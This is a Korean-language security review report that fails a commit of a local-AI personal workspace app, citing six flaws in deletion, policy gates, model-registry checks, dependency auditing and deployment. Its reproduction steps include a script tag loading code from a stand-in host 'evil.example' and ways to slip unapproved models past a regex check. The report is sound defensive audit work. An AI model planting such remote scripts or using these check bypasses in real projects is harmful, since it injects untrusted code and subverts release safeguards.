# Task 9 독립 보안 검토 보고서

- 검토 대상 커밋: `e6df059956a400059f6058d5f386b9d034e03f2b`
- 검토 일자: 2026-07-30
- 검토자: 줄리아 (독립 보안 검토)
- 최종 판정: **FAIL**
- 발견 사항: Critical 0 / Important 6 / Minor 0

본 검토는 전체 삭제가 현재ㆍ레거시 저장소를 포함하여 실제로 완결되는지, 실패가 성공으로 표시되지 않는지, 로컬 모델과 비의료 정책 게이트가 우회되지 않는지, 정적 웹 산출물의 CSP와 CIㆍ배포 게이트가 요구 수준인지 확인했습니다. `npm run verify`는 통과했지만, 아래 항목들은 그 검증 게이트 자체가 놓치는 보안 결함입니다.

## Important

### I-01. 모바일 전체 삭제 실패가 사용자에게 성공으로 표시됩니다

**위치**

- `apps/mobile/src/security/clearMobileData.ts:41-46`
- `apps/mobile/src/state/useLifeWorkspace.ts:185-203`
- `apps/mobile/src/ui/LifeWorkspaceScreen.tsx:39`

`clearAllMobileData()`는 추론 중지, 알림, 모델, 작업공간 및 메모리 삭제를 모두 시도한 뒤 실패를 `AggregateError`로 던집니다. 그러나 `useLifeWorkspace.deleteAll()`의 `resetMemory` 콜백은 삭제 실패 여부와 무관하게 메모리 상태를 초기화하고 `"이 기기의 개인 생활 작업공간과 알림을 삭제했습니다."`라는 완료 메시지를 설정합니다. 화면의 확인 버튼은 `onPress: () => void props.onDeleteAll()`로 Promise를 폐기하므로, 뒤늦은 `AggregateError`도 사용자에게 전달되지 않습니다.

**재현**

기존 `useLifeWorkspace` 컨트롤러 테스트의 의존성에서 `deleteWorkspace`만 예외를 던지도록 바꾸고 `deleteAll()`을 호출합니다. 삭제 함수는 거부되지만 `resetMemory`가 실행되어 잠금 상태와 함께 위의 성공 메시지가 설정됩니다. 실제 저장소 삭제가 실패해 데이터가 남아도 UI는 삭제 완료로 보입니다.

**영향**

개인 생활 데이터가 기기에 남아 있는데 사용자가 삭제됐다고 믿게 됩니다. 전체 삭제의 실패-폐쇄(fail-closed) 요구를 충족하지 못합니다.

**필수 조치**

모든 영속 삭제와 검증이 성공한 후에만 메모리 초기화 및 성공 문구를 설정해야 합니다. 실패 시에는 잠금 상태를 유지하되 실패한 저장소를 명시한 오류 상태를 UI에 표시하고, UI 이벤트에서 Promise 거부를 관찰해야 합니다.

### I-02. 웹 전체 삭제가 현재 로컬 저장소, IndexedDB 데이터베이스 및 레거시 개인 데이터를 모두 제거하지 않습니다

**위치**

- `src/features/workspace/workspaceRepository.ts:7-8,22-26,110-128,196-202`
- 과거 구현 `669f596:src/features/storage/careManualRepository.ts`의 `careguardian.manual`
- 과거 구현 `669f596:src/app/state/useCareAppState.ts`의 `careguardian.manual` 읽기

현재 `clearWorkspace()`는 IndexedDB 레코드를 삭제하는 대신 `ClearedWorkspace` 톰스톤을 다시 기록합니다. IndexedDB 데이터베이스 자체는 제거하지 않고, `life-steward.workspace.v1` 로컬 저장소 키를 제거하는 `removeLegacyWorkspace()`도 전체 삭제 경로에서는 호출하지 않습니다. 또한 이전 앱이 암호문을 저장했던 `careguardian.manual` 키는 현재 삭제 인벤토리에 전혀 없습니다.

**재현**

브라우저 저장소에 현재 IndexedDB 작업공간과 `life-steward.workspace.v1`, 또는 이전 앱의 `careguardian.manual`을 함께 넣고 전체 삭제를 실행합니다. IndexedDB에는 톰스톤이 남고, 로컬 저장소 키와 `careguardian.manual`은 제거되지 않습니다. 현재 테스트는 구형 건강 형태 키를 읽거나 변환하지 않는지만 확인하며, 전체 삭제에서 제거되는지는 검증하지 않습니다.

**영향**

삭제 요구 뒤에도 앱 소유 데이터와 과거 민감 데이터가 브라우저 프로필에 남습니다. 동일 출처에서 실행되는 후속 코드나 기기 접근자가 개발자 도구를 통해 남은 데이터를 확인할 수 있으며, "모든 현재ㆍ레거시 영속 데이터 삭제" 요구를 만족하지 못합니다.

**필수 조치**

웹 삭제 인벤토리에 모든 현재ㆍ레거시 키, IndexedDB 데이터베이스/스토어, 서비스 워커 캐시 등 실제 소유 저장소를 명시적으로 포함하십시오. 삭제 후 열거 기반 검증을 하고, 멀티 탭 쓰기 경합과 레거시 데이터 재생성도 테스트하십시오. 톰스톤이 필요하면 개인 데이터를 포함하지 않음을 검증하고 전체 삭제 완료 판정과 분리해야 합니다.

### I-03. 비의료ㆍ원격 통신ㆍCSP 게이트가 공개 정적 자산과 허용 목록 파일을 쉽게 우회합니다

**위치**

- `scripts/check-non-medical-release.mjs:6-32`
- `scripts/check-static-security.mjs:4`
- `public/privacy-policy.html:1-50`

비의료 릴리스 검사기는 `public/privacy-policy.html`과 `package.json`을 읽기 전에 건너뛰고, `assistantPolicy.ts`, `LocalAiScreen.tsx`, `mobileWorkspaceRepository.ts`, `lifeNotifications.ts`는 파일 전체를 정책 검사에서 제외합니다. 모델 레지스트리 파일도 원격 URL 검사에서 제외됩니다. 검사는 원시 `https://` 문자열만 찾으므로 동적 URL 조합, `fetch` 등의 원격 전송 API, 푸시 토큰/외부 전송을 보장하지 못합니다.

정적 CSP 검사는 `dist/index.html` 하나만 확인합니다. 반면 Vite는 `public/privacy-policy.html`을 `dist/privacy-policy.html`로 그대로 복사하며, 현재 개인정보 처리방침에는 CSP가 없고 인라인 `style`도 있습니다.

**재현**

`public/privacy-policy.html`에 `<script src="https://evil.example/x.js"></script>`를 추가한 뒤 빌드합니다. 정책 검사는 이 파일을 검사하지 않고, 정적 보안 검사는 `dist/index.html`만 보므로 공개 Pages의 `privacy-policy.html`에 원격 스크립트가 배포돼도 두 게이트는 통과합니다. 허용 목록 파일 안에서는 동일하게 원격 전송 코드가 정책 검사를 피합니다.

**영향**

공개 개인정보 처리방침 같은 릴리스 자산에서 임의 원격 스크립트가 실행될 수 있고, 비의료ㆍ로컬 전용 정책이 소스 변경에 대한 실질적 방어선이 되지 못합니다.

**필수 조치**

공개되는 모든 HTML 산출물에 동일한 CSP 기준을 적용하고, 개인정보 처리방침은 외부 스크립트와 인라인 실행을 허용하지 않도록 수정하십시오. 파일 전체 예외를 제거하고 최소 단위의 주석 기반 예외와 사유를 사용하십시오. AST/번들 기반 검사 또는 명시적 네트워크 API 차단으로 동적 URL 및 전송 API를 검사하며, 모든 공개 자산을 포함한 변이 테스트를 추가하십시오.

### I-04. 로컬 모델 레지스트리 검사가 주석과 동적 URL을 신뢰하여 허용되지 않은 설치형 모델을 놓칩니다

**위치**

- `scripts/check-model-registry.mjs:25-53,78-84`
- `scripts/check-non-medical-release.mjs:32`
- `apps/mobile/src/local-ai/modelRegistry.ts:242-246`
- `apps/mobile/src/local-ai/modelStore.ts:172-180`

모델 검사는 TypeScript를 파싱하지 않고 `export const MODEL_REGISTRY` 이후의 원시 텍스트를 정규식으로 해석합니다. 따라서 주석에 정상 레지스트리 복사본을 두고 실제 상수를 변경하거나, 다운로드 URL을 템플릿 문자열/문자열 결합으로 만들면 검사 범위를 벗어납니다. 실제 설치 목록은 `getInstallableModels()`의 반환값이며, 그 반환값은 별도로 검증되지 않습니다. 정책 검사도 이 파일의 URL 검사를 명시적으로 건너뜁니다.

**재현**

검토 중 파일을 수정하지 않고 소스 문자열을 메모리에서 변형했습니다. `getInstallableModels()`가 승인 목록에 `availability: "installable"`인 미승인 모델을 추가하고 URL을 `https:${"//huggingface.co"}/...`로 구성하도록 바꾼 문자열을 `validateRegistrySource()`에 전달했습니다. 결과는 `status: "pass", problems: []`였습니다. 원본과 같은 유효한 레지스트리 사본을 주석으로 앞에 둔 뒤 실제 레지스트리의 파일 크기와 URL을 변조한 경우도 같은 결과로 통과했습니다.

**영향**

검증된 오프라인 모델만 설치한다는 보장이 소스 검사 우회 한 번으로 무너집니다. 미승인 모델의 공급망, 라이선스, 해시 및 원격 다운로드 경로가 릴리스에 포함될 수 있습니다.

**필수 조치**

정규식 기반 텍스트 스캔 대신 TypeScript AST 또는 실제 모듈의 구조화된 목록을 검증하십시오. `getInstallableModels()`의 결과를 직접 허용 목록과 대조하고, URL은 정적 리터럴/검증된 구성 값만 허용하십시오. 주석 미끼, 중복 선언, 템플릿 문자열ㆍ문자열 결합 URL을 포함한 변이 테스트를 릴리스 게이트에 추가하십시오.

### I-05. 프로덕션 의존성 감사 게이트는 "다른 advisory"를 정확히 거부하지 못합니다

**위치**

- `scripts/check-production-audit.mjs:21-37`
- `docs/security-release-gate.md:63-67`

현재 감사 결과는 만료일, 심각도 수, 취약 패키지 수와 비교되고, 관측된 advisory가 기준 목록에 없을 때만 실패합니다. 반대로 기준에 있던 advisory가 사라지고 같은 수의 다른 advisory가 들어오는 경우, 또는 허용 목록에 남아 있는 advisory가 실제 결과에서 사라지는 경우에는 양방향 집합 비교를 하지 않습니다. 따라서 요구한 "새로운 또는 다른 advisory"를 정확히 검출하지 못합니다.

현재 `npm audit --omit=dev` 결과 자체는 기준과 일치했습니다(Critical 0, High 19, Moderate 10, 총 29; GHSA 6건도 동일). 이는 현재 기준선이 맞다는 뜻일 뿐, 검사 로직의 동등성 보장은 아닙니다.

**영향**

의존성 변경으로 취약점 식별자가 바뀌어도 동일한 개수와 패키지 조건을 만족하면 릴리스 게이트가 통과할 수 있습니다. 감사 수용 문서가 의도한 정확한 위험 수용 범위를 보장하지 못합니다.

**필수 조치**

실제 advisory 식별자 집합과 수용된 집합을 정렬 후 양방향으로 정확히 비교하고, 누락ㆍ추가ㆍ교체 모두 실패시키십시오. 결과 패키지/심각도/advisory 변이 각각에 대한 음성 테스트를 추가하십시오.

### I-06. GitHub Pages 배포 워크플로가 필수 검증 게이트와 독립적으로 배포됩니다

**위치**

- `.github/workflows/deploy-pages.yml:33-55,62-79`
- `.github/workflows/ci.yml:34-61`

Pages 배포의 `build` 작업은 테스트, 빌드, 정적 CSP, 비의료 정책, 모델 레지스트리 검사만 실행합니다. `release:model-check:test`, `release:audit-policy`, 모바일 타입 검사 및 Expo doctor는 CI에만 있습니다. `main` 푸시에서 CI와 Pages 배포는 별개 워크플로이므로, CI의 감사 정책 또는 변이 테스트가 같은 커밋을 실패시켜도 Pages 배포가 먼저 완료될 수 있습니다.

**영향**

배포 산출물은 전체 필수 릴리스 보안 검증의 성공을 선행 조건으로 갖지 않습니다. 특히 I-04/I-05 방어를 보강한 후에도, 배포 경로가 해당 검사를 생략하면 정책 위반 정적 산출물이 공개될 수 있습니다.

**필수 조치**

하나의 재사용 가능한 릴리스 검증 작업을 만들고 CI와 배포가 동일한 검증 결과를 사용하게 하십시오. 배포는 해당 SHA의 모든 필수 보안ㆍ정책 게이트 성공을 `needs` 또는 검증된 워크플로 완료 조건으로 요구해야 합니다.

## 확인된 방어 통제

- `npm run verify`는 통과했습니다. Vitest 20 파일/175 테스트, Vite 빌드, 정적 보안 검사, 모바일 타입 검사, Expo doctor(18/18), 정책 및 모델 검사, 모델 변이 검사, 감사 정책 검사가 모두 실행됐습니다.
- `dist/index.html`의 CSP는 `default-src 'self'`, `script-src 'self'`, `object-src 'none'`, `base-uri 'none'`, `connect-src 'self'` 등으로 설정돼 있으며 인라인 스크립트를 요구하지 않습니다.
- Android 로컬 인증은 `disableDeviceFallback: false`를 사용합니다. 설치된 `expo-local-authentication` Android 구현은 기기 자격 증명(Device Credential)을 허용하므로 PIN/패턴/비밀번호 대체 경로가 비활성화되지 않았고 인증 실패 시 닫힌 상태로 처리됩니다. 다만 실제 Android 기기 검증은 별도 Task 10 범위입니다.
- 모바일 삭제 인벤토리는 현재ㆍ구형 키/데이터베이스/알림/로컬 모델을 폭넓게 열거하고 삭제 후 존재 여부를 검증합니다. I-01은 이 하위 삭제 절차의 실패를 상위 UX가 성공으로 오인시키는 결함입니다.
- 워크플로의 GitHub Actions 참조는 확인 당시 모두 전체 커밋 SHA로 고정돼 있었고, CI 권한은 `contents: read`로 최소화돼 있습니다.
- 소스 트리에서 하드코딩된 비밀값은 확인되지 않았습니다.

## 검증 명령 및 결과

```powershell
npm run verify
npm audit --omit=dev
```

첫 번째 명령은 통과했습니다. 두 번째 명령은 수용 기준선과 현재 일치했으나, I-05의 검사 로직 결함은 별도 확인됐습니다.

## 재검토 종료 조건

I-01부터 I-06까지를 수정하고, 각 재현 사례가 실패하도록 자동 테스트를 추가한 뒤 전체 삭제(현재ㆍ레거시 웹/모바일 저장소, 멀티 탭 포함), 정책/CSP 모든 공개 산출물, 모델 허용 목록, 감사 정확성, 배포 선행 게이트를 다시 검토해야 합니다.
